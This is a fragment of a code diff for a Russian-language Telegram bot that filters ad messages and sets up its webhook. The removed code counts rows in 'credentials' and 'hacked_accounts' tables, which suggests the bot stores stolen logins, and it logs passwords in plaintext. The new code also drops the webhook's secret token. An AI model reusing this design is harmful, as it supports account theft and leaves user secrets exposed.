+    if user and user['prefix'] in ['Создатель', 'Админ', 'ТехПомощник']:
+        logger.debug(f"Пропуск проверки для {user['prefix']}")
+        return
+    for keyword in ad_keywords:
+        if keyword in text:
+            try:
+                bot.delete_message(chat_id, message.message_id)
+                bot.send_message(
+                    chat_id,
+                    "🚫 *Реклама запрещена!* Свяжитесь с @sacoectasy для разрешения.",
+                    parse_mode='Markdown'
                 )
-                inactive = c.fetchall()
-                for user_id, last_activity in inactive:
-                    logger.info(f"Неактивен {user_id}: {last_activity}")
-                conn.close()
-        except Exception as e:
-            logger.error(f"Ошибка мониторинга: {e}")
-        time.sleep(3600)
+                logger.warning(f"Реклама от {chat_id}: {text}")
+                bot.send_message(
+                    ADMIN_CHAT_ID,
+                    f"🚨 *Обнаружена реклама*\n👤 *От*: {chat_id}\n📜 *Текст*: {text}",
+                    parse_mode='Markdown'
+                )
+            except Exception as e:
+                logger.error(f"Ошибка удаления рекламы: {e}")
+            return
 
-# Статистика
-def get_db_stats():
-    logger.info("Запрос статистики")
-    conn = get_db_connection()
-    if conn is None:
-        logger.error("База недоступна")
-        return None
-    try:
-        c = conn.cursor()
-        c.execute("SELECT COUNT(*) FROM users")
-        user_count = c.fetchone()[0]
-        c.execute("SELECT COUNT(*) FROM credentials")
-        cred_count = c.fetchone()[0]
-        c.execute("SELECT COUNT(*) FROM hacked_accounts")
-        hacked_count = c.fetchone()[0]
-        logger.info(f"Статистика: {user_count} users, {cred_count} creds, {hacked_count} hacked")
-        return {'users': user_count, 'credentials': cred_count, 'hacked': hacked_count}
-    except Exception as e:
-        logger.error(f"Ошибка статистики: {e}")
-        return None
-    finally:
-        conn.close()
-
-# Валидация пароля
-def validate_password(password):
-    logger.debug(f"Валидация: {password}")
-    if len(password) < 6:
-        logger.warning("Короткий пароль")
-        return False
-    if not re.search(r'[A-Za-z0-9]', password):
-        logger.warning("Нет букв/цифр")
-        return False
-    logger.debug("Пароль ок")
-    return True
-
-# Запуск
-if __name__ == '__main__':
+# Запуск бота
+def start_bot():
     logger.info("Запуск бота")
-    if not init_db():
-        logger.error("Ошибка базы")
-        raise Exception("Database init failed")
+    try:
+        bot.set_webhook(url=f"{SITE_URL}/webhook", drop_pending_updates=True)
+        logger.info(f"Вебхук установлен: {SITE_URL}/webhook")
+    except Exception as e:
+        logger.error(f"Ошибка вебхука: {e}")
     threading.Thread(target=keep_alive, daemon=True).start()
     logger.info("Keep_alive запущен")
-    threading.Thread(target=monitor_activity, daemon=True).start()
-    logger.info("Мониторинг запущен")
-    try:
-        logger.info("Удаление вебхука")
-        bot.remove_webhook()
-        time.sleep(1)
-        webhook_url = f'{SITE_URL}/webhook'
-        logger.info(f"Установка вебхука: {webhook_url}")
-        bot.set_webhook(url=webhook_url, secret_token=SECRET_WEBHOOK_TOKEN)
-        logger.info("Вебхук установлен")
-        app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
-    except Exception as e:
-        logger.error(f"Ошибка запуска: {e}")
-        raise
+    init_db()
+    logger.info("База инициализирована")
+    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
+
+if __name__ == '__main__':
+    start_bot()
